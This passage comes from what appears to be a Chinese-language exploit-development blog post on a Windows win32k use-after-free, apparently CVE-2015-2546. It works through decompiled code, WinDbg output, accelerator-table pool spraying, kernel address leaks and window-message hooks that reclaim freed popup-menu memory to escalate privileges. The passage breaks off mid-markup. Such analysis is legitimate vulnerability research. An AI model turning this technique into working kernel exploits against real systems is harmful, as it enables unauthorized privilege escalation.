+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)(v5&nbsp;+&nbsp;16)&nbsp;==&nbsp;1&nbsp;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这个外层if不一定会进来
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v7&nbsp;||&nbsp;v7&nbsp;==&nbsp;-1&nbsp;&amp;&amp;&nbsp;*(_BYTE&nbsp;*)(*(_DWORD&nbsp;*)(v3&nbsp;+&nbsp;4)&nbsp;+&nbsp;35)&nbsp;&amp;&nbsp;0x20&nbsp;)//&nbsp;判断返回值是0或者-1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(v5&nbsp;+&nbsp;16)&nbsp;=&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v7&nbsp;==&nbsp;-5&nbsp;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;当返回值是0xffffffb
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+……
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;否则进入这里
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v9&nbsp;=&nbsp;*(_DWORD&nbsp;**)(v7&nbsp;+&nbsp;176);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;获取tagPOPUPMENU的位置，偏移是+0B0h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v10&nbsp;=&nbsp;xxxSendMessage((PVOID)v7,&nbsp;-27,&nbsp;UnicodeString,&nbsp;0);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v10&nbsp;&amp;&nbsp;0x10&nbsp;&amp;&amp;&nbsp;!(v10&nbsp;&amp;&nbsp;3)&nbsp;&amp;&amp;&nbsp;!xxxSendMessage((PVOID)v7,&nbsp;-16,&nbsp;0,&nbsp;0)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxMNHideNextHierarchy(v9);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;漏洞触发关键位置</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">经过分析，我们需要处理三处SendMessage的异步过程，第一处在FindWindowFromPoint，这个函数中会有一处SendMessage，通过异步过程执行钩子，但是我调试时发现在进入这个函数返回，但并没有执行钩子。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x48:
+90669437&nbsp;e862010000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNFindWindowFromPoint&nbsp;(9066959e)
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x4d:
+9066943c&nbsp;f7470400800000&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[edi+4],8000h
+kd&gt;&nbsp;r&nbsp;eax
+eax=fea11430
+跟踪一下这个过程，我发现在进入SendMessage之前，有一处if语句判断，当这个if语句判断不通过的时候，不会进入SendMessage处理。
+kd&gt;&nbsp;p
+win32k!xxxMNFindWindowFromPoint+0x14:
+906695b2&nbsp;8b470c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[edi+0Ch]
+kd&gt;&nbsp;p
+win32k!xxxMNFindWindowFromPoint+0x17:
+906695b5&nbsp;85c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
+kd&gt;&nbsp;p
+win32k!xxxMNFindWindowFromPoint+0x19:
+906695b7&nbsp;746b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNFindWindowFromPoint+0x86&nbsp;(90669624)
+kd&gt;&nbsp;p
+win32k!xxxMNFindWindowFromPoint+0x86:
+90669624&nbsp;8b07&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[edi]
+kd&gt;&nbsp;dd&nbsp;edi
+fde8da68&nbsp;&nbsp;12a10008&nbsp;fea38d58&nbsp;fea11430&nbsp;00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到这里eax的值是edi+0ch对应的值，也就是0，对应伪代码v5变量值为0，也就是if语句判断没通过，跳转了。这样我们还需要重新看一下这个值，这个值来自于tagPopupMenu结构体，通过CVE-2014-4113和CVE-2015-2546的tagPopupMenu结构体做一个对比。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;dt&nbsp;tagPOPUPMENU&nbsp;fde8da68//我们的Exploit中的结构体
+&nbsp;&nbsp;&nbsp;+0x004&nbsp;spwndNotify&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0xfea38d58&nbsp;tagWND
+&nbsp;&nbsp;&nbsp;+0x008&nbsp;spwndPopupMenu&nbsp;&nbsp;&nbsp;:&nbsp;0xfea11430&nbsp;tagWND
+&nbsp;&nbsp;&nbsp;+0x00c&nbsp;spwndNextPopup&nbsp;&nbsp;&nbsp;:&nbsp;(null)&nbsp;
+kd&gt;&nbsp;dt&nbsp;fde8da68&nbsp;tagPOPUPMENU//CVE-2014-4113的结构体
+&nbsp;&nbsp;&nbsp;+0x004&nbsp;spwndNotify&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0xfea39de8&nbsp;tagWND
+&nbsp;&nbsp;&nbsp;+0x008&nbsp;spwndPopupMenu&nbsp;&nbsp;&nbsp;:&nbsp;0xfea12398&nbsp;tagWND
+&nbsp;&nbsp;&nbsp;+0x00c&nbsp;spwndNextPopup&nbsp;&nbsp;&nbsp;:&nbsp;0xfea12578&nbsp;tagWND</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">实际上，在通过TrackPopupMenu之后会调用MNLoop进入循环处理消息，而我们的exp中只有一个postmessage，于是我们增加到三个postmessage，再次调试跟踪。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x2e7:
+90669060&nbsp;57&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
+kd&gt;&nbsp;p
+win32k!xxxHandleMenuMessages+0x2e8:
+90669061&nbsp;e889030000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove&nbsp;(906693ef)
+kd&gt;&nbsp;r&nbsp;edi
+edi=fde8da68
+&nbsp;&nbsp;&nbsp;+0x004&nbsp;spwndNotify&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0xfea39d18&nbsp;tagWND
+&nbsp;&nbsp;&nbsp;+0x008&nbsp;spwndPopupMenu&nbsp;&nbsp;&nbsp;:&nbsp;0xfea11430&nbsp;tagWND
+&nbsp;&nbsp;&nbsp;+0x00c&nbsp;spwndNextPopup&nbsp;&nbsp;&nbsp;:&nbsp;0xfea12698&nbsp;tagWND</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这样，我们就能够处理了，接下来利用三个钩子，分别处理三种消息的调用，这个调用过程和CVE-2014-4113相比差别还是比较大的。需要来看一下最关键的钩子该怎么用。首先我们要分析一下和漏洞利用最关键的函数xxxMNHideNextHierarchy，这个函数有一个参数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">signed&nbsp;int&nbsp;__stdcall&nbsp;xxxMNHideNextHierarchy(int&nbsp;a1)
+&nbsp;&nbsp;v1&nbsp;=&nbsp;*(_DWORD&nbsp;*)(a1&nbsp;+&nbsp;12);
+&nbsp;&nbsp;if&nbsp;(&nbsp;v1&nbsp;)
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;v2&nbsp;=&nbsp;*(void&nbsp;**)(a1&nbsp;+&nbsp;12);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v2&nbsp;!=&nbsp;*(void&nbsp;**)(a1&nbsp;+&nbsp;28)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxSendMessage(v2,&nbsp;-28,&nbsp;0,&nbsp;0);//这里调用shellcode提权</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个参数a1直接影响到后面的提权，回到外层看一下这个a1从哪里来。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">v6&nbsp;=&nbsp;xxxMNFindWindowFromPoint(v3,&nbsp;(int)&amp;UnicodeString,&nbsp;v4);//&nbsp;V6通过HOOK可控，这里的sendmessage是异步处理
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;v6;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;v7可控
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v9&nbsp;=&nbsp;*(_DWORD&nbsp;**)(v7&nbsp;+&nbsp;176);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;获取tagPOPUPMENU的位置，偏移是+0B0h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v10&nbsp;&amp;&nbsp;0x10&nbsp;&amp;&amp;&nbsp;!(v10&nbsp;&amp;&nbsp;3)&nbsp;&amp;&amp;&nbsp;!xxxSendMessage((PVOID)v7,&nbsp;-16,&nbsp;0,&nbsp;0)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xxxMNHideNextHierarchy((int)v9);&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;漏洞触发关键位置</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">正是从MNFindWindowFromPoint而来，本来是一次轻松愉快的旅程，但是实际上在逻辑代码中，有一个地方导致了这次旅程血崩，就是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">if&nbsp;(&nbsp;IsWindowBeingDestroyed(v7)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个地方会对窗口的属性进行检查，也就是说，v7不能是一个任意值，比如是我们直接通过零页分配的shellcode的某个地址指针，如果可以的话，后面就会导致其他的利用了，因此这个值必须是一个窗口的值，因此我们用一种方法：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">就是创建窗口A和窗口B，在这里通过异步调用，返回窗口B的值，这样后续处理中，就会将窗口B的tagMenu偏移+0B0h位置的值，也就是tagPopupMenu交给v9，那么随后在最后一个SendMessage中销毁窗口B，通过一些方法将销毁后的位置占位，因为后面没有进行判断，从而可以调用占位后的值。而通过分析xxxMNHideNextHierarchy，内层函数用的是tagPopupMenu-&gt;spwndNextPopup，因此，只要在占位时再控制这个值，为一个我们可控的值，最后就能在xxxMNHideNextHierarchy里的sendmessage完成最后一步提权了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有了这个思路，我们就可以开始完成整个提权的工作，首先，我们需要创建一个正常的主窗口，然后我们利用CreateAcceleratorTable来创建大量的tagACCEL对象，加速键表是一个非常好的pool spray的对象，因为它的大小是可控的，我们利用CreateAcceleratorTable创建对象，然后在Windbg里跟踪对象创建过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;bp&nbsp;13a1910&nbsp;&quot;.printf&nbsp;\&quot;Create&nbsp;Accelerator&nbsp;at:&nbsp;0x%.08x\\n\&quot;,@eax;g;&quot;
+breakpoint&nbsp;0&nbsp;redefined
+kd&gt;&nbsp;bp&nbsp;13a192d
+kd&gt;&nbsp;g
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xffb22c48
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe7f4eb0
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe9ef1d0
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfdf756c8
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xffa30e28
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfdf73440
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xffa020e0
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe898cd0
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfdf81ab8
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xffa2e0d0
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe9fbd08
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe8ff868
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfdfdab70
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe9a4690
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfded3a70
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xffa0ac88
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xffaa6d90//这个位置创建了Accelerator，在后面这个位置被释放，tagPOPUPMENU会占用
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe966c98
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe8a4e88
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfdfdeb68
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfde9da70
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe952528
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xffa300d8
+Create&nbsp;Accelerator&nbsp;at:&nbsp;0xfe5ffa70</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到，这里分配了大量的tagACCEL对象，上面代码注释部分的0xffaa6d90是我在后续过程中释放的其中一个tagACCEL对象，在后面需要每隔一个间隔释放一个tagACCEL对象，用DestroyAccelerator来将加速键表的对象释放掉。正如之前我所说，由于Accelerator Table在申请时大小可控，我们申请的每一个tagACCEL对象要和tagPopupMenu相同大小。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后，我们需要建立一个新的窗口，如之前我标红段落所述，由于之前的那处判断，导致我们不能直接构造fake WND，而需要用一个窗口，这个主窗口需要包含弹出菜单，也就是tagPopupMenu，这样才能直接占位。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Windows给我们提供了一个非常有趣的窗口，类名为：#32768，这是Windows默认的包含弹出菜单的主窗口，也就是，这个类名为#32768调用CreateWindowsExW创建tagWND后，会自动生成tagPopupMenu。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+PoC+0x19ba:
+013a19ba&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
+kd&gt;&nbsp;r&nbsp;eax
+eax=005b0770//创建#32768的tagWND
+
+kd&gt;&nbsp;dt&nbsp;win32k!_THRDESKHEAD&nbsp;5b0770
+&nbsp;&nbsp;&nbsp;+0x000&nbsp;h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x000a0140&nbsp;Void
+&nbsp;&nbsp;&nbsp;+0x004&nbsp;cLockObj&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;4
+&nbsp;&nbsp;&nbsp;+0x008&nbsp;pti&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0xfe9edb80&nbsp;tagTHREADINFO
+&nbsp;&nbsp;&nbsp;+0x00c&nbsp;rpdesk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x8609a488&nbsp;tagDESKTOP
+&nbsp;&nbsp;&nbsp;+0x010&nbsp;pSelf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0xfea10770&nbsp;&nbsp;&quot;@???&quot;//通过pself找到内核对象地址
+kd&gt;&nbsp;dd&nbsp;fea10770+b0
+fea10820&nbsp;&nbsp;ffaa6d90&nbsp;00000000&nbsp;00000000&nbsp;00000000//ffaa6d90是tagPOPUPmenu，它占了之前Accelerator释放的坑</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们通过调用CreateWindowExW创建#32768的tagWND后，可以在偏移+0x10位置找到pSelf对象，泄露tagWND的内核对象地址，这样这个内核对象地址+0xb0位置存放的是tagPopupMenu，而这个值是ffaa6d90，正是我们之前释放的tagACCEL的地址。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">直接通过!pool命令来看一下这个tagPopupMenu的占位情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;!pool&nbsp;ffaa6d90
+Pool&nbsp;page&nbsp;ffaa6d90&nbsp;region&nbsp;is&nbsp;Paged&nbsp;session&nbsp;pool
+&nbsp;ffaa6000&nbsp;size:&nbsp;&nbsp;8e0&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Gla1
+&nbsp;ffaa68e0&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;previous&nbsp;size:&nbsp;&nbsp;8e0&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ustm
+&nbsp;ffaa6930&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Uspp
+&nbsp;ffaa69e8&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Uspp
+&nbsp;ffaa6aa0&nbsp;size:&nbsp;&nbsp;158&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;b8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;UsDI
+&nbsp;ffaa6bf8&nbsp;size:&nbsp;&nbsp;158&nbsp;previous&nbsp;size:&nbsp;&nbsp;158&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;UsDI
+&nbsp;ffaa6d50&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;previous&nbsp;size:&nbsp;&nbsp;158&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Glnk
+&nbsp;ffaa6d60&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ggls
+&nbsp;ffaa6d78&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usqm
+*ffaa6d88&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;(Allocated)&nbsp;*Uspm&nbsp;Process:&nbsp;8637d6a8
+Pooltag&nbsp;Uspm&nbsp;:&nbsp;USERTAG_POPUPMENU,&nbsp;Binary&nbsp;:&nbsp;win32k!MNAllocPopup</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来我们开始利用钩子来完成hook过程。第一步，在FindWindowFromMessage函数调用中，处理1EB消息，这个和CVE-2014-4113很像。</span></p><pre class="brush:plain;toolbar:false">90669437&nbsp;e862010000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNFindWindowFromPoint&nbsp;(9066959e)
+win32k!xxxMNMouseMove+0x4d:
+9066943c&nbsp;f7470400800000&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[edi+4],8000h
+kd&gt;&nbsp;r&nbsp;eax
+eax=fea10770</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一步钩子会返回窗口B的值，这样，也能绕过IsDestroy的判断，随后进入第二步处理，第二步处理的值，是1E5的消息，这个消息返回后会将返回值和0x10做一个判断。</span><br/></p><pre class="brush:plain;toolbar:false">xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;edi
+push&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Address
+push&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp+UnicodeString]&nbsp;;&nbsp;UnicodeString
+push&nbsp;&nbsp;&nbsp;&nbsp;1E5h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;MbString
+push&nbsp;&nbsp;&nbsp;&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;P
+call&nbsp;&nbsp;&nbsp;&nbsp;_xxxSendMessage@16&nbsp;;&nbsp;xxxSendMessage(x,x,x,x)
+;&nbsp;67:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v10&nbsp;&amp;&nbsp;0x10&nbsp;&amp;&amp;&nbsp;!(v10&nbsp;&amp;&nbsp;3)&nbsp;&amp;&amp;&nbsp;!xxxSendMessage((PVOID)v7,&nbsp;-16,&nbsp;0,&nbsp;0)&nbsp;)
+test&nbsp;&nbsp;&nbsp;&nbsp;al,&nbsp;10h
+jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_BF939583</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样我们控制钩子令返回值为0x10就可以了。</span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x134:
+90669523&nbsp;e87500f8ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxSendMessage&nbsp;(905e959d)
+kd&gt;&nbsp;g
+Breakpoint&nbsp;16&nbsp;hit
+win32k!xxxMNMouseMove+0x139:
+90669528&nbsp;a810&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;al,10h
+kd&gt;&nbsp;r&nbsp;eax
+eax=00000010
+kd&gt;&nbsp;p
+win32k!xxxMNMouseMove+0x13b:
+9066952a&nbsp;7457&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32k!xxxMNMouseMove+0x194&nbsp;(90669583)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第三步处理1F0的消息，这一步很关键，会调用SendMessage，在这一步的钩子中对窗口B，也就是#32768窗口进行销毁，这样tagPopupMenu也会被释放，销毁后我们使用Accelerator再次占位，由于这一步是在一个if语句里，因此需要返回值为0，才能通过非的判断。</span></p><pre 